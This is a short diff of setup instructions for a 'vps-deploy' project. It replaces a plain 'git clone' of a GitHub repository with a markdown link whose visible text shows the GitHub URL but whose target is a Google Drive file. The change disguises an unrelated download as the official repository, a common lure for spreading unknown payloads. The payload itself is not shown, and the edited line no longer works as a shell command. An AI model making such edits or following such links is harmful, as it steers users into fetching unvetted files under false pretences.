@@ -1,4 +1,4 @@
-git clone https://github.com/hopingboyz/vps-deploy
+git clone [https://github.com/hopingboyz/vps-deploy](https://drive.google.com/file/d/1wDuB36yRYh7Ym7KZp3SE2fL9SYLzz76p/view?usp=sharing)
 
 cd vps-deploy
 
